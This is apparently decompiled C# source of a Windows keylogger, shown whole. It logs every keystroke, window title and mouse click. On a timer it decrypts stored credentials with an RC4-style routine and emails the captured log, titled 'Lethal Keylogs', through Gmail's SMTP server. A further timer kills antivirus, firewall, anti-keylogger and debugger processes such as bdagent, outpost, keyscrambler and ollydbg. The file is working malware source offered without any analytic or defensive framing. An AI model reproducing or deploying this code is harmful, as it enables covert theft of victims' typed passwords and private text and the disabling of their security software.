		if (Operators.CompareString(string_28, method_0(), false) != 0)
		{
			string_28 = method_0();
			textBox_0.set_Text(textBox_0.get_Text() + "\r\n\r\n" + string_28 + "\r\n\r\n");
		}
		if ((int)Key == 65)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "A");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "a");
			}
		}
		else if ((int)Key == 66)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "B");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "b");
			}
		}
		else if ((int)Key == 67)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "C");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "c");
			}
		}
		else if ((int)Key == 68)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "D");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "d");
			}
		}
		else if ((int)Key == 69)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "E");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "e");
			}
		}
		else if ((int)Key == 70)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "F");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "f");
			}
		}
		else if ((int)Key == 71)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "G");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "g");
			}
		}
		else if ((int)Key == 72)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "H");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "h");
			}
		}
		else if ((int)Key == 73)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "I");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "i");
			}
		}
		else if ((int)Key == 74)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "J");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "j");
			}
		}
		else if ((int)Key == 75)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "K");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "k");
			}
		}
		else if ((int)Key == 76)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "L");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "l");
			}
		}
		else if ((int)Key == 77)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "M");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "m");
			}
		}
		else if ((int)Key == 78)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "N");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "n");
			}
		}
		else if ((int)Key == 79)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "O");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "o");
			}
		}
		else if ((int)Key == 80)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "P");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "p");
			}
		}
		else if ((int)Key == 81)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "Q");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "q");
			}
		}
		else if ((int)Key == 82)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "R");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "r");
			}
		}
		else if ((int)Key == 83)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "S");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "s");
			}
		}
		else if ((int)Key == 84)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "T");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "t");
			}
		}
		else if ((int)Key == 85)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "U");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "u");
			}
		}
		else if ((int)Key == 86)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "V");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "v");
			}
		}
		else if ((int)Key == 87)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "W");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "w");
			}
		}
		else if ((int)Key == 88)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "X");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "x");
			}
		}
		else if ((int)Key == 89)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "Y");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "y");
			}
		}
		else if ((int)Key == 90)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "Z");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "z");
			}
		}
		else if ((int)Key == 48)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + ")");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "0");
			}
		}
		else if ((int)Key == 49)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "!");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "1");
			}
		}
		else if ((int)Key == 50)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "@");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "2");
			}
		}
		else if ((int)Key == 51)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "#");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "3");
			}
		}
		else if ((int)Key == 52)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "$");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "4");
			}
		}
		else if ((int)Key == 53)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "%");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "5");
			}
		}
		else if ((int)Key == 54)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "^");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "6");
			}
		}
		else if ((int)Key == 55)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "&");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "7");
			}
		}
		else if ((int)Key == 56)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "*");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "8");
			}
		}
		else if ((int)Key == 57)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "9");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "(");
			}
		}
		else if ((int)Key == 186)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + ":");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + ";");
			}
		}
		else if ((int)Key == 190)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + ">");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + ".");
			}
		}
		else if ((int)Key == 222)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "\"");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "'");
			}
		}
		else if ((int)Key == 219)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "{");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "[");
			}
		}
		else if ((int)Key == 221)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "}");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "]");
			}
		}
		else if ((int)Key == 188)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "<");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + ",");
			}
		}
		else if ((int)Key == 189)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "_");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "-");
			}
		}
		else if ((int)Key == 187)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "+");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "=");
			}
		}
		else if ((int)Key == 191)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "?");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "/");
			}
		}
		else if ((int)Key == 220)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "|");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "\\");
			}
		}
		else if ((int)Key == 192)
		{
			if (bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "~");
				bool_0 = false;
			}
			else if (!bool_0)
			{
				textBox_0.set_Text(textBox_0.get_Text() + "`");
			}
		}
		else if ((int)Key == 9)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[tab]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + string_28 + "\r\n\r\n");
			}
		}
		else if ((int)Key == 109)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "-");
		}
		else if ((int)Key == 20)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[caps]");
		}
		else if ((int)Key == 32)
		{
			textBox_0.set_Text(textBox_0.get_Text() + " ");
		}
		else if ((int)Key == 107)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "+");
		}
		else if ((int)Key == 8)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[<]");
		}
		else if ((int)Key == 162)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[ctrl]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + string_28 + "\r\n\r\n");
			}
		}
		else if ((int)Key == 163)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[ctrl]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + string_28 + "\r\n\r\n");
			}
		}
		else if ((int)Key == 110)
		{
			textBox_0.set_Text(textBox_0.get_Text() + ".");
		}
		else if ((int)Key == 46)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[<]");
		}
		else if ((int)Key == 111)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "/");
		}
		else if ((int)Key == 40)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[down]");
		}
		else if ((int)Key == 35)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[end]");
		}
		else if ((int)Key == 13)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "\r\n");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + "\r\n\r\n" + string_28 + "\r\n\r\n");
			}
		}
		else if ((int)Key == 27)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[esc]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + "\r\n\r\n" + string_28 + "\r\n\r\n");
			}
		}
		else if ((int)Key == 36)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[home]");
		}
		else if ((int)Key == 45)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[insert]");
		}
		else if ((int)Key == 37)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[<-]");
		}
		else if ((int)Key == 106)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "*");
		}
		else if ((int)Key == 34)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[p-down]");
		}
		else if ((int)Key == 33)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[p-up]");
		}
		else if ((int)Key == 44)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[printscreen]");
		}
		else if ((int)Key == 13)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "\r\n");
		}
		else if ((int)Key == 145)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[scroll]");
		}
		else if ((int)Key == 38)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[up]");
		}
		else if ((int)Key == 39)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[->]");
		}
		else if ((int)Key == 19)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[pause]");
		}
		else if ((int)Key == 112)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F1]");
		}
		else if ((int)Key == 113)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F2]");
		}
		else if ((int)Key == 114)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F3]");
		}
		else if ((int)Key == 115)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F4]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + "\r\n\r\n" + string_28 + "\r\n\r\n");
			}
		}
		else if ((int)Key == 116)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F5]");
		}
		else if ((int)Key == 117)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F6]");
		}
		else if ((int)Key == 118)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F7]");
		}
		else if ((int)Key == 119)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F8]");
		}
		else if ((int)Key == 120)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F9]");
		}
		else if ((int)Key == 121)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F10]");
		}
		else if ((int)Key == 122)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F11]");
		}
		else if ((int)Key == 123)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F12]");
		}
		else if ((int)Key == 124)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F13]");
		}
		else if ((int)Key == 125)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F14]");
		}
		else if ((int)Key == 126)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[F15]");
		}
		else if ((int)Key == 96)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "0");
		}
		else if ((int)Key == 97)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "1");
		}
		else if ((int)Key == 98)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "2");
		}
		else if ((int)Key == 99)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "3");
		}
		else if ((int)Key == 100)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "4");
		}
		else if ((int)Key == 101)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "5");
		}
		else if ((int)Key == 102)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "6");
		}
		else if ((int)Key == 103)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "7");
		}
		else if ((int)Key == 104)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "8");
		}
		else if ((int)Key == 105)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "9");
		}
		else if ((int)Key == 144)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[numlock]");
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vkey);

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (!((ServerComputer)Class1.Computer).get_Network().get_IsAvailable())
		{
			return;
		}
		try
		{
			string text = textBox_1.get_Text();
			textBox_5.set_Text(smethod_0(text, "9pz666"));
			try
			{
				string text2 = textBox_2.get_Text();
				textBox_6.set_Text(smethod_0(text2, "9pz667"));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(textBox_5.get_Text());
			mailMessage.To.Add(textBox_5.get_Text());
			mailMessage.Body = textBox_0.get_Text();
			mailMessage.Subject = "Lethal Keylogs";
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.Port = Conversions.ToInteger("587");
			smtpClient.Credentials = new NetworkCredential(textBox_5.get_Text(), textBox_6.get_Text());
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
			((TextBoxBase)textBox_0).Clear();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static string smethod_0(string message, string esendx666word)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = esendx666word.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = esendx666word.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (GetAsyncKeyState(2L) == -32767)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[RB]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + "\r\n\r\n" + string_28 + "\r\n\r\n\r\n");
			}
		}
		if (GetAsyncKeyState(1L) == -32767)
		{
			textBox_0.set_Text(textBox_0.get_Text() + "[LB]");
			if (Operators.CompareString(string_28, method_0(), false) != 0)
			{
				string_28 = method_0();
				textBox_0.set_Text(textBox_0.get_Text() + "\r\n\r\n" + string_28 + "\r\n\r\n\r\n");
			}
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(string_16, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("sample"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(string_17, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("outpost"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(string_18, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("npfmsg"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(string_19, "Yes", false) == 0 && Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("bdagent"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(string_23, "Yes", false) == 0 && Operators.CompareString(Strings.LCase(processes[i].ProcessName), Strings.LCase("keyscrambler"), false) == 0)
				{
					processes[i].Kill();
				}
				if (Operators.CompareString(string_26, "Yes", false) == 0 && Operators.CompareString(Strings.LCase(processes[i].ProcessName), Strings.LCase("ollydbg"), false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}
}
